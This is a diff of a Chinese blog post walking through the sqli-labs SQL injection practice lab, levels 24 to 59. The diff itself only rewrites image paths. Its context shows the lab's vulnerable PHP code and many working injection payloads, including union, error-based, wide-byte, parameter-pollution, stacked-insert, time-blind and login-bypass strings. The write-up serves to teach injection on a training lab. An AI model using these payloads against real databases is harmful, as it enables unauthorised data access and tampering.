 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">创建账号的地方</span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br></pre></td></tr></table></figure>
@@ -515,7 +515,7 @@
 
 <p>更新密码的地方直接引用了，我们就实现自己账号来改管理员账号</p>
 <p><code>admin&#39;#</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907175040985.png" alt="image-20220907175040985"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907175040985.png" alt="image-20220907175040985"></p>
 <p>成功</p>
 <h1 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h1><p>这里定义了一个黑名单参数，也就是不能使用or和and了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -524,7 +524,7 @@
 
 <p>union联合注入不就没有这两个东西嘛</p>
 <p><code>-1&#39; union select 1,(select username from users where id=8),3&#39;</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907180600089.png" alt="image-20220907180600089"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907180600089.png" alt="image-20220907180600089"></p>
 <h1 id="less26-过滤空格和特殊字符"><a href="#less26-过滤空格和特殊字符" class="headerlink" title="less26-过滤空格和特殊字符"></a>less26-过滤空格和特殊字符</h1><p>这一关就是特殊符号变多了罢了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -533,7 +533,7 @@
 <p>报错注入空格使用比较少所以我们可以使用报错注入。</p>
 <p><code>id=-1&#39;||extractvalue(1,concat(0x5c,database(),0x5c))||&#39;0</code></p>
 <p><code>1&#39;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1))||&#39;0</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907183733394.png" alt="image-20220907183733394"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907183733394.png" alt="image-20220907183733394"></p>
 <h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>黑名单更多了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -548,12 +548,12 @@
 <p><code>id=0&#39;)uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#39;security&#39;and (&#39;1</code></p>
 <h1 id="less29-参数污染"><a href="#less29-参数污染" class="headerlink" title="less29-参数污染"></a>less29-参数污染</h1><p>index页面存在一个注入</p>
 <p><code>-1&#39;||extractvalue(1,concat(0x5c,database(),0x5c))||&#39;0</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907185853625.png" alt="image-20220907185853625"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907185853625.png" alt="image-20220907185853625"></p>
 <p>但是还存在一个登陆界面</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">这行代码也就是提取每一个参数名为id的参数，返回一个参数值。我们这里就可以使用参数污染来。</span><br></pre></td></tr></table></figure>
 
 <p>所以我们就用参数污染来就可以了，<code>id=1&amp;id=1&#39; and (extractvalue(1,concat(0x5c,database(),0x5c)))||&#39;0</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907191009511.png" alt="image-20220907191009511"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907191009511.png" alt="image-20220907191009511"></p>
 <h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>一样的，参数污染，只不过需要闭合双引号</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> .<span class="variable">$id</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
@@ -564,7 +564,7 @@
 <h1 id="less32-宽字节注入"><a href="#less32-宽字节注入" class="headerlink" title="less32-宽字节注入"></a>less32-宽字节注入</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=check_addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">看到这就明白了吧，宽字节注入，编码不同嘛。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><code>id=-3%20and%20%df%27%20union%20select%201,database(),3%20--+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907193936122.png" alt="image-20220907193936122"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907193936122.png" alt="image-20220907193936122"></p>
 <h1 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h1><p>和上面一样，只是换了个函数罢了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$string</span>= addslashes(<span class="variable">$string</span>);    </span><br></pre></td></tr></table></figure>
 
@@ -574,11 +574,11 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=-123%df&#x27; union select 1,database() --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907194710480.png" alt="image-20220907194710480"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907194710480.png" alt="image-20220907194710480"></p>
 <h1 id="less35"><a href="#less35" class="headerlink" title="less35"></a>less35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=check_addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">一直这种的宽字节注入有意思吗？笑死没有引号，直接联合注入</span><br></pre></td></tr></table></figure>
 
 <p><code>id=-1 union select 1,2,database()</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907195432350.png" alt="image-20220907195432350"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907195432350.png" alt="image-20220907195432350"></p>
 <h1 id="less36"><a href="#less36" class="headerlink" title="less36"></a>less36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一样的</span><br><span class="line"><span class="variable">$string</span>= mysql_real_escape_string(<span class="variable">$string</span>);    </span><br><span class="line">就是换了个函数罢了</span><br></pre></td></tr></table></figure>
 
 <p><code>id=-3%20and%20%df%27%20union%20select%201,database(),3%20--+</code></p>
@@ -586,10 +586,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = mysql_real_escape_string(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= mysql_real_escape_string(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>
 
 <p><code>uname=admin&amp;passwd=123%df&#39; union select 1,database() --+&amp;submit=Submit</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907200928572.png" alt="image-20220907200928572"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907200928572.png" alt="image-20220907200928572"></p>
 <h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><p>没理解什么意思，不是直接绕过了吗</p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201305999.png" alt="image-20220907201305999"></p>
-<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201624561.png" alt="image-20220907201624561"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201305999.png" alt="image-20220907201305999"></p>
+<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201624561.png" alt="image-20220907201624561"></p>
 <p>看了大佬的解说，这可以用堆叠注入。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">向表中插入数据</span><br><span class="line">?id=1&#x27;;insert into users(id,username,password) values (&#x27;38&#x27;,&#x27;less38&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure>
 
@@ -603,30 +603,30 @@
 <h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">又是一个post的报错注入啊</span><br></pre></td></tr></table></figure>
 
 <p><code>login_user=asd&amp;login_password=-1&#39; union select 1,extractvalue(1,(concat(1,database(),0x5c))),3 --+&amp;mysubmit=Login</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907205356414.png" alt="image-20220907205356414"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907205356414.png" alt="image-20220907205356414"></p>
 <h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>和上面一样，只不过多了个括号</p>
 <p><code>login_user=asd&amp;login_password=-1&#39;) union select 1,extractvalue(1,(concat(1,database(),0x5c))),3 --+&amp;mysubmit=Login</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210018082.png" alt="image-20220907210018082"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210018082.png" alt="image-20220907210018082"></p>
 <h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>不报错了啊</p>
 <p><code>login_user=asd&amp;login_password=-1&#39;or 1=1 --+&amp;mysubmit=Login</code></p>
 <p>万能密码可以进去，但是想报数据库的话用时间盲注吧。</p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210359235.png" alt="image-20220907210359235"></p>
-<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210818029.png" alt="image-20220907210818029"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210359235.png" alt="image-20220907210359235"></p>
+<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210818029.png" alt="image-20220907210818029"></p>
 <p>和上面一样，加了个括号罢了</p>
 <h1 id="less46-order-by-报错注入"><a href="#less46-order-by-报错注入" class="headerlink" title="less46-order by 报错注入"></a>less46-order by 报错注入</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];	</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><code>sort=1 and extractvalue(1,concat(0x5c,database(),0x5c)) --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908102836598.png" alt="image-20220908102836598"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908102836598.png" alt="image-20220908102836598"></p>
 <h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>闭合一下单引号，然后报错注入</p>
 <p><code>sort=1&#39; and extractvalue(1,concat(0x5c,database())) --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103120248.png" alt="image-20220908103120248"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103120248.png" alt="image-20220908103120248"></p>
 <h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>和46关一样，只是不报错了，我们使用时间盲注。</p>
 <p><code>sort=1%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103750327.png" alt="image-20220908103750327"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103750327.png" alt="image-20220908103750327"></p>
 <h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p><code>sort=1%27%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</code></p>
 <p>闭合单引号的时间盲注</p>
 <h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p><code>sort=1 and extractvalue(1,concat(0x5c,database())) --+</code></p>
@@ -644,7 +644,7 @@
 <h1 id="less54"><a href="#less54" class="headerlink" title="less54"></a>less54</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><code>id=-1&#39; union select 1,database(),2 --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908111630245.png" alt="image-20220908111630245"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908111630245.png" alt="image-20220908111630245"></p>
 <h1 id="less55"><a href="#less55" class="headerlink" title="less55"></a>less55</h1><p>闭合括号的联合注入</p>
 <p><code>id=-1) union select 1,database(),2 --+</code></p>
 <h1 id="less56"><a href="#less56" class="headerlink" title="less56"></a>less56</h1><p>闭合单引号括号的联合注入</p>
@@ -653,14 +653,14 @@
 <p><code>id=-1&quot; union select 1,database(),2 --+</code></p>
 <h1 id="less58"><a href="#less58" class="headerlink" title="less58"></a>less58</h1><p>闭合单引号的报错注入</p>
 <p><code>id=-1&#39; and extractvalue(1,concat(0x5c,database())) --+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908112508666.png" alt="image-20220908112508666"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908112508666.png" alt="image-20220908112508666"></p>
 <h1 id="less59"><a href="#less59" class="headerlink" title="less59"></a>less59</h1><p><code>?id=-1 and extractvalue(1,concat(0x5c,database())) --+</code></p>
